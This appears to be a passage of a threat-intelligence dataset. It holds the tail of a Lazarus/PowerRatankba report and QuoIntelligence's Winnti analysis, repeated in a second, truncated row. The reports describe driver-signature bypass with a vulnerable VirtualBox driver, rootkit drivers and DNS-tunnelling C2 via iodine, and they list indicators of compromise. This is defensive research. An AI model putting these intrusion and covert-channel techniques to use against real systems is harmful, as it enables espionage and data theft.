is deemed interesting. PowerRatankba is capable of the following functions: * Send data to the server * Delete agent * Modify and replace files (.ps1 and .VBS) * Download files * Kill agent (exit) * Delay execution * Encrypted panel commands (sdel | run) * No command executes a batch script In December 2017, researchers first discovered and documented [PowerRatankba](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new). Reportedly, the malware is a successor to an earlier implant dubbed Ratankba, used within the Lazarus group’s financially focused attacks. We identified an [earlier version](https://www.hybrid-analysis.com/sample/db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471?environmentId=100) of [PowerRatankba](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new) submitted to Hybrid Analysis in January 2018, and comparative analysis of the sample in both cases exhibits some aspects of evolution. Notably, it offers the same basic functionality, but differently named commands (e.g. killkill instead of kagent) and some optimization in a few places. Lazarus is known for continuously evolving its toolset and Tactics, Techniques and Procedures (TTPs). **itextsharp.dll** **SHA-256:** 2938200b7c0300c31aa458860b9f4f684f4f3f5893ab0f1d67c9d797168cad17 The DLL file appears to be a legit implementation of the PDF generation library called iTextSharp. The application program requires this external library to generate the PDF mentioned initially by the threat actor. To note, this file is not required for the malicious functionality of the application program. **#ApplicantsName#.pdf** The PDF is the printed version of the application filled out by the user, containing the same fields. If an applicant fills out all the fields of the application and clicks finish in the last step, it will generate this exact file based on the supplied data. However, the PDF generation only works if the DLL is present in the same directory as the application program. Figure 5 shows a redacted version of the analyzed PDF. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/858/1*kzYCcSTkeYdB7eGiXDQnkg.png) Figure 5 — Redacted version of the PDF containing victim’s personal information **Victim** ========== Acquiring the user generated PDF from completing the fake application made the victimology process more precise. Firstly, it is clear that the victim is interested in a position with Cards and Payment Systems and has experience with POS and ATM Acquiring, EMV Contact and Contactless and Mobile. Secondly, OSINT analysis revealed the identity of the targeted individual on social media and his current employment, directly or as a contractor, as an IT professional by an entity within the financial services industry. Considering the initial attack vector used in Chile also targeted an IT staff member at RedBanc, it is highly likely that the same threat actors would target the above described individual. **Conclusion** ============== Lazarus is an APT threat actor group that has operated since at least 2009, and attributed to a variety attacks across multiple sectors including financials, and entertainment. While we have evidence to support that this latest activity occurred during the timeframe where multiple Pakistani banks were heavily targeted by cyber criminals, we still cannot confirm that all those attacks were committed by the same threat actor. [1] At this time, we cannot entirely rule out this artifact being part of a deception operation. [2] This blog post does not include any Personal Identifiable Information of the victim. However, we contacted the affected company in order to let them aware of the incident. [Learn more about our Threat Intelligence service](https://quointelligence.eu/#offering) * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"")"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-04-20_winnti-group-insights-from-the.txt,quoteintelligence_2020-04-20_winnti-group-insights-from-the,G0004,"WINNTI GROUP: Insights From the Past Apr 20, 2020 Newly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company ---------------------------------------------------------------------------------------------- ### Executive Summary * In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. As part of our responsible disclosure, we alerted the affected entity, the local Law Enforcements, and our clients. * In the following weeks after our internal reporting, the German news media source Tagesschau [reported](https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html) our initial detection and analysis of the sample, and confirmed the chemical company’s awareness of the attack in the second half of 2019. * The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment. * Although the malware was likely used years ago, further analysis revealed a previously unreported C2 technique never attributed to any Winnti Group’s toolkits. * The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server. * Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company. * The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group targeting a plethora of different industry sectors in Europe and South Asia. ### Introduction The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. The suspected state-sponsor link to China’s government pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. On Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. Additionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company. In the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019). This most recent previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015. Prior to our analysis this attack activity was not publicly reported. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-1-1.png) *Figure 1: Timeline of attacks located in Germany and attributed to Winnti* In December 2019, Germany’s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group. Through our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report. The sample also matches known characteristics of Winnti’s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf). Further, we have informed the affected company, law enforcement agencies, and sent a Warning to our customers upon detection. ### The Winnti Group The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. Notably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware. Active since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry. However, as researchers have continued to follow and dissect the group and its activity, the group’s target focus has expanded to other industries, including chemical, pharmaceutical, technology, and software. Further, the group’s evolution involves the enhancement, development, and inclusion of new tools and tactics. The suspected state-sponsor link to China’s government, pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. In the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho. The campaign waves apparently take a more targeted approach to selecting potential victims across various sectors including financials, government, and information technology. According to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors. Technical Analysis ------------------ ### Sample Targeting German Chemical Company The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation timestamp suggesting the sample was built in August 2015. Although the compilation time might be legitimate, it is not possible to determine when and how long the attackers used this malware. | **HASHES** | **Compilation** **Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | *Table 1 – Winnti sample* ### Binary Analysis Similar to other Winnti samples, the configuration section contains a string referring to the name of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical company – redacted for the purposes of this blog. *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-X-1.png)* *Figure 2 – Extracted configuration from Winnti sample* The analysed artifact we observed contains the following binaries listed below, and also aligns with observations in the BfV report. | **HASHES** | **Compilation Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | | **MD5**: cf140dc4cad9e8216545593a4c08c7be **SHA1**: 2b319b44451abb0596b9187e06f1fb7b4ace969d **SHA256**: bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 | 2015-08-05 12:08:00 | driver1.sys | | **MD5**: cc95391d75ce2443740f60114fe30ae9 **SHA1**: 30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a **SHA256**: 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf | 2015-05-05 11:31:13 | driver2.sys | | **MD5**: b4e66b445b39d0368bbe4b91a3cd98ff **SHA1**: 2bc358ddc72f59ba0373b8635ab08ad747c12180 **SHA256**: 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 | 2014-12-15 16:06:41 | dsefix.exe | | **MD5**: eaea9ccb40c82af8f3867cd0f4dd5e9d **SHA1**: 7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c **SHA256**: cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 | 2008-May-31 02:18:53 UTC | vboxdrv.sys | *Table 2 – Additional artifacts contained by bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860* **Analysis of dsefix.exe** This is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can bypass driver verification and install its own drivers. We identified the following two drivers which were embedded in the earlier described main artifact. To note that this technique does not work on moden Windows (e.g. Windows 10) – yet another piece of evidence that this malware was designed and used multiple years ago. **Analysis of vboxdriver** This is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation. It is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix. **Analysis of driver1.sys** In late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver. The sample is capable of injecting raw packets into the network and receiving special formatted packets. In comparison, our variant has the same exact number of bytes, and there are large parts exactly matching. **Analysis of driver2.sys** This rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings. However, this driver supports different versions of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns early. ### C2 DNS Tunneling By analyzing the malware, it is possible to find two network indicators within its code: ``` ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-2-1024x82.png) ``` *Figure 3 – observed network IoCs in Winnti sample* The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com). This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system’s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved. The dick[.]mooo[.]com FQDN name is offered by [FreeDNS](https://freedns.afraid.org/), which is a free dynamic DNS service. Notably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN*.* Additional analysis revealed that the malware generates subdomains with base128 encoding, and append them to FQDN. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-y.png) *Code 1 – Hostname length restriction* Further, dots are added into it every 57 characters potentially as a hostname length restriction, suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to 2000 characters. Upon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) – software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, [observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings. The implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section. **Use of Iodine for C2 DNS Tunneling** The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions: *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Table-3.png)* *Table 3 – Malware DLL Functions* For instance, the 64bit executable contains the build\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3): ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code_2.png) *Code 2- iodine\_0-6-0\_build\_hostname* ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code-3.png) *Code 3- iodine\_0-6-0\_build\_hostname* Based on the presence of the functions base128\_blksize\_enc and base128\_blksize\_raw, we determined the version used, while not exactly known, is from before May 2017 when a patch removed those functions. Further, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable. The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-3.png) *Figure 4 – C2 channel over DNS* 1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com). Notably, NULL and TXT DNS request types are iodine’s preferred channels since they are “[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)”. It is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research. 2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained. To note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server. 3.The DNS server returns the authoritative answer by forwarding the content of the NULL record type to the infected host. Notably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level. **The NULL DNS record type** The implementation of NULL type tunneling can be observed in the following excerpt taken while reversing the malware: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-2.png) The third argument when calling dns\_encode shall be of the type “struct query” from Iodine’s [dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232) ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-4.png) According to [common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), “struct query” is defined as: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-6-300x192.png) Since QUERY\_NAME\_SIZE equals to 512 (4 *128 – integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type. As noted, reversing activity detailed the query[128] value to be 0xa. From Iodine’s [windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\_NULL is DNS\_TYPE\_NULL ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-7-300x136.png) Finally, from [Windows’s documentation](https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants), DNS\_TYPE\_NULL is actually a Windows constant equal to 0xa ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-8-274x300.png) ### Winnti Signed Code With Digital Certificate from IQ Technology During our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company. Although the report is no longer online, the discussed [sample](https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en) contains a compilation timestamp of August 2015, which is the earliest one observed in the wild that we identified using this digital certificate. At the time of analysis, the digital certificate was already revoked. The sample’s structure, debug symbols, and explanatory debug messages included within suggests it is highly likely be a development version. Additionally, the compilation timestamp indicates the sample was created 20 minutes prior to the *driver1.sys.* Both samples are highly related, and its contents combined with the date of analysis and reporting essentially solidify that it existed in 2015; however, this does not necessarily corroborate to an attack timeframe. ### Sample Targeting South Korean Gaming Company | **HASHES** | **Compilation Timestamp** | | **MD5:** 00961922e22e6a5d30b1d6fbd667d3c4 **SHA1**: 0fd54c26b593bd9e9218492d50d8873521c0ec0d **SHA256:** 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 | 2016-03-07 09:44:01 | *Table 3 – observed network IoCs in Winnti sample* On 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service. As multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner. **Binary Analysis** The sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/rundl.png) Unfortunately we were not able to find the payload meant to be decrypted by this dropper. However, we were able to extract the malware’s configuration file and identify the intended target. In this case, the following string was included within the extracted configuration: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/gravity.png) Based on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company. The company is known for its Massive Multiplayer Online Role Playing Game (MMORPG) [*Ragnarok Online*](http://www.gravity.co.kr/en/games/), which is also offered as a mobile application. As we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan. Interestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-9.png) *Excerpt from ESET Research White paper “*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*”* At this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting. ### Conclusion The Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources. The detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group’s interest in German DAX companies. As a result, organizations of all sizes, but especially small to medium sized companies, including Germany’s *hidden champions*, should prepare against such threats as they are vital to the economic ecosystem and continuous development of niche markets. Government oversight (local, regional, and across the EU) should ensure susceptible organizations such as these are following regulation and implementing security best practices to protect against future attacks. Appendix -------- ### Indicators of Compromise 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c *.dick[.]mooo[.]com 208[.]67[.]222[.]222 45[.]248[.]85[.]200 ### MITRE ATT&CK | **Tactic** | **Technique** | **Recommended Course of Action** | | Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques. | | Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding [T1014](https://attack.mitre.org/techniques/T1014/) Rootkit [T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate. Enforce signature validation via Group Policies for executables | | Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | – For DNS Tunnel, ensure that DNS logs are collected and reviewed. – DNS telemetic data should be also collected in order to spot frequent and heavy loaded DNS communication that are definitely not related to an usual DNS query. – FreeDNS and DynDNS servers should be blacklisted/synkholed if not strictly required – DNS NULL type queries should not be avoided. Only the required record types should be allowed. | * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. MessageSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-04-20_winnti-group-insights-from-the.txt,quoteintelligence_2020-04-20_winnti-group-insights-from-the,G0010,"WINNTI GROUP: Insights From the Past Apr 20, 2020 Newly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company ---------------------------------------------------------------------------------------------- ### Executive Summary * In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. As part of our responsible disclosure, we alerted the affected entity, the local Law Enforcements, and our clients. * In the following weeks after our internal reporting, the German news media source Tagesschau [reported](https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html) our initial detection and analysis of the sample, and confirmed the chemical company’s awareness of the attack in the second half of 2019. * The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment. * Although the malware was likely used years ago, further analysis revealed a previously unreported C2 technique never attributed to any Winnti Group’s toolkits. * The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server. * Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company. * The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group targeting a plethora of different industry sectors in Europe and South Asia. ### Introduction The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. The suspected state-sponsor link to China’s government pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. On Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. Additionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company. In the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019). This most recent previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015. Prior to our analysis this attack activity was not publicly reported. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-1-1.png) *Figure 1: Timeline of attacks located in Germany and attributed to Winnti* In December 2019, Germany’s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group. Through our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report. The sample also matches known characteristics of Winnti’s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf). Further, we have informed the affected company, law enforcement agencies, and sent a Warning to our customers upon detection. ### The Winnti Group The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. Notably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware. Active since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry. However, as researchers have continued to follow and dissect the group and its activity, the group’s target focus has expanded to other industries, including chemical, pharmaceutical, technology, and software. Further, the group’s evolution involves the enhancement, development, and inclusion of new tools and tactics. The suspected state-sponsor link to China’s government, pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. In the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho. The campaign waves apparently take a more targeted approach to selecting potential victims across various sectors including financials, government, and information technology. According to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors. Technical Analysis ------------------ ### Sample Targeting German Chemical Company The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation timestamp suggesting the sample was built in August 2015. Although the compilation time might be legitimate, it is not possible to determine when and how long the attackers used this malware. | **HASHES** | **Compilation** **Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | *Table 1 – Winnti sample* ### Binary Analysis Similar to other Winnti samples, the configuration section contains a string referring to the name of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical company – redacted for the purposes of this blog. *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-X-1.png)* *Figure 2 – Extracted configuration from Winnti sample* The analysed artifact we observed contains the following binaries listed below, and also aligns with observations in the BfV report. | **HASHES** | **Compilation Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b 